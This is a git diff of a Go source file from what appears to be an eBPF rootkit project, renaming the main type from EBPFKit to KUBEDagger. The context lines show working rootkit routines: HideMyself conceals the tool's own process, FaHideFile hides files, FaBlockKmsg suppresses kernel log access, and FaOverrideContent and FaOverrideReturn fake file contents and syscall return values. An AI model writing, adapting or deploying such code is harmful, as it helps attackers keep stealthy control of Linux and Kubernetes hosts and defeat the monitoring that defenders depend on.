@@ -1,5 +1,5 @@
 /*
-Copyright © 2021 MOHAMMED YASIN
+Copyright © 2023 MOHAMMED YASIN
 
 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
@@ -40,8 +40,8 @@ import (
 	"github.com/yasindce1998/KubeDagger/pkg/assets"
 )
 
-// EBPFKit is the main EBPFKit structure
-type EBPFKit struct {
+// KUBEDagger is the main KUBEDagger structure
+type KUBEDagger struct {
 	options   Options
 	startTime time.Time
 
@@ -54,23 +54,23 @@ type EBPFKit struct {
 	faPathAttr map[FaPathKey]FaPathAttr
 }
 
-// New creates a new EBPFKit instance
-func New(options Options) *EBPFKit {
-	return &EBPFKit{
+// New creates a new KUBEDagger instance
+func New(options Options) *KUBEDagger {
+	return &KUBEDagger{
 		options:    options,
 		faPathAttr: make(map[FaPathKey]FaPathAttr),
 	}
 }
 
-// Start initializes and start EBPFKit
-func (e *EBPFKit) Start() error {
+// Start initializes and start KUBEDagger
+func (e *KUBEDagger) Start() error {
 	if err := e.start(); err != nil {
 		return err
 	}
 	return nil
 }
 
-func (e *EBPFKit) ParseMountInfo(pid int32) ([]*mountinfo.Info, error) {
+func (e *KUBEDagger) ParseMountInfo(pid int32) ([]*mountinfo.Info, error) {
 	f, err := os.Open(fmt.Sprintf("/proc/%d/mountinfo", pid))
 	if err != nil {
 		return nil, err
@@ -80,7 +80,7 @@ func (e *EBPFKit) ParseMountInfo(pid int32) ([]*mountinfo.Info, error) {
 	return mountinfo.GetMountsFromReader(f, nil)
 }
 
-func (e *EBPFKit) FatGetFdKeys(path string) []FaFdKey {
+func (e *KUBEDagger) FatGetFdKeys(path string) []FaFdKey {
 	matches, err := filepath.Glob("/proc/*/fd/*")
 	if err != nil {
 		return nil
@@ -112,7 +112,7 @@ func (e *EBPFKit) FatGetFdKeys(path string) []FaFdKey {
 	return keys
 }
 
-func (e *EBPFKit) Kmsg(str string) {
+func (e *KUBEDagger) Kmsg(str string) {
 	f, err := os.OpenFile("/dev/kmsg", os.O_WRONLY|os.O_APPEND, os.ModePerm)
 	if err != nil {
 		return
@@ -120,7 +120,7 @@ func (e *EBPFKit) Kmsg(str string) {
 	defer f.Close()
 	f.WriteString(str)
 }
-func (e *EBPFKit) FaPutFdContent(m *ebpf.Map, id uint64, reader io.Reader) {
+func (e *KUBEDagger) FaPutFdContent(m *ebpf.Map, id uint64, reader io.Reader) {
 	key := FaFdContentKey{
 		ID: id,
 	}
@@ -147,7 +147,7 @@ func (e *EBPFKit) FaPutFdContent(m *ebpf.Map, id uint64, reader io.Reader) {
 	}
 }
 
-func (e *EBPFKit) FaPutPathAttr(m *ebpf.Map, path string, attr FaPathAttr, override bool) error {
+func (e *KUBEDagger) FaPutPathAttr(m *ebpf.Map, path string, attr FaPathAttr, override bool) error {
 	var zeroAttr FaPathAttr
 
 	for i, key := range FaPathKeys(path) {
@@ -176,7 +176,7 @@ func (e *EBPFKit) FaPutPathAttr(m *ebpf.Map, path string, attr FaPathAttr, overr
 	return nil
 }
 
-func (e *EBPFKit) FaBlockKmsg() ([]FaFdKey, error) {
+func (e *KUBEDagger) FaBlockKmsg() ([]FaFdKey, error) {
 	faFdKeys := e.FatGetFdKeys("/dev/kmsg")
 
 	filesMap, _, err := e.bootstrapManager.GetMap("fa_fd_attrs")
@@ -209,7 +209,7 @@ func (e *EBPFKit) FaBlockKmsg() ([]FaFdKey, error) {
 	return faFdKeys, nil
 }
 
-func (e *EBPFKit) FaUnBlockKsmg(faFdKeys []FaFdKey) error {
+func (e *KUBEDagger) FaUnBlockKsmg(faFdKeys []FaFdKey) error {
 	filesMap, _, err := e.bootstrapManager.GetMap("fa_fd_attrs")
 	if err != nil {
 		return errors.Wrap(err, "unable to find map")
@@ -223,7 +223,7 @@ func (e *EBPFKit) FaUnBlockKsmg(faFdKeys []FaFdKey) error {
 	return nil
 }
 
-func (e *EBPFKit) FaOverrideContent(fsType string, path string, reader io.Reader, append bool, comm string) {
+func (e *KUBEDagger) FaOverrideContent(fsType string, path string, reader io.Reader, append bool, comm string) {
 	id := FNVHashStr(fsType + "/" + path)
 
 	attr := FaPathAttr{
@@ -244,7 +244,7 @@ func (e *EBPFKit) FaOverrideContent(fsType string, path string, reader io.Reader
 	e.FaPutFdContent(contentsMap, id, reader)
 }
 
-func (e *EBPFKit) FaOverrideReturn(fsType string, path string, value int64) {
+func (e *KUBEDagger) FaOverrideReturn(fsType string, path string, value int64) {
 	attr := FaPathAttr{
 		FSType:      fsType,
 		Action:      FaOverrideReturnAction,
@@ -255,7 +255,7 @@ func (e *EBPFKit) FaOverrideReturn(fsType string, path string, value int64) {
 	e.FaPutPathAttr(pathKeysMap, path, attr, false)
 }
 
-func (e *EBPFKit) FaHideFile(fsType string, dir string, file string) {
+func (e *KUBEDagger) FaHideFile(fsType string, dir string, file string) {
 	attr := FaPathAttr{
 		FSType:     fsType,
 		Action:     FaHideFileAction,
@@ -268,7 +268,7 @@ func (e *EBPFKit) FaHideFile(fsType string, dir string, file string) {
 	e.FaOverrideReturn(fsType, path.Join(dir, file), -2)
 }
 
-func (e *EBPFKit) HideMyself() error {
+func (e *KUBEDagger) HideMyself() error {
 	fi, err := os.Stat(fmt.Sprintf("/proc/%d/exe", os.Getpid()))
 	if err != nil {
 		return errors.Wrap(err, "unable to find proc entry")
@@ -296,7 +296,7 @@ func (e *EBPFKit) HideMyself() error {
 	return nil
 }
 
-func (e *EBPFKit) FaFillKmsgMap() {
+func (e *KUBEDagger) FaFillKmsgMap() {
 	file, err := os.Open("/dev/kmsg")
 	if err != nil {
 		log.Fatal(err)
@@ -354,7 +354,7 @@ func (e *EBPFKit) FaFillKmsgMap() {
 	}
 }
 
-func (e *EBPFKit) applyOverride() {
+func (e *KUBEDagger) applyOverride() {
 	if e.options.SrcFile != "" && e.options.TargetFile != "" {
 		file, err := os.Open(e.options.SrcFile)
 		if err == nil {
@@ -366,7 +366,7 @@ func (e *EBPFKit) applyOverride() {
 	}
 }
 
-func (e *EBPFKit) installMain() error {
+func (e *KUBEDagger) installMain() error {
 	getMap := func(name string) *ebpf.Map {
 		m, _, _ := e.bootstrapManager.GetMap(name)
 		return m
@@ -464,7 +464,7 @@ func (e *EBPFKit) installMain() error {
 	return nil
 }
 
-func (e *EBPFKit) dumpPrograms() {
+func (e *KUBEDagger) dumpPrograms() {
 	var progIds []int
 	prev := 0
 	for {
@@ -485,7 +485,7 @@ func (e *EBPFKit) dumpPrograms() {
 	fmt.Printf("Programs: %+v\n", progIds)
 }
 
-func (e *EBPFKit) start() error {
+func (e *KUBEDagger) start() error {
 	// fetch ebpf assets
 	bootstrapBuf, err := assets.Asset("/bootstrap.o")
 	if err != nil {
@@ -531,8 +531,8 @@ func (e *EBPFKit) start() error {
 	return nil
 }
 
-// Stop shuts down EBPFKit
-func (e *EBPFKit) Stop() error {
+// Stop shuts down KUBEDagger
+func (e *KUBEDagger) Stop() error {
 	if err := e.bootstrapManager.Stop(manager.CleanAll); err != nil {
 		return errors.Wrap(err, "couldn't stop manager")
 	}
@@ -543,7 +543,7 @@ func (e *EBPFKit) Stop() error {
 	return nil
 }
 
-func (e *EBPFKit) setupMainMaps() error {
+func (e *KUBEDagger) setupMainMaps() error {
 	var err error
 	// select maps
 	e.httpPatterns, _, err = e.mainManager.GetMap("http_patterns")
@@ -553,7 +553,7 @@ func (e *EBPFKit) setupMainMaps() error {
 	return nil
 }
 
-func (e *EBPFKit) setupMainProgramMaps() error {
+func (e *KUBEDagger) setupMainProgramMaps() error {
 	time.Sleep(time.Second)
 
 	bpfProgMap, _, err := e.mainManager.GetMap("bpf_programs")
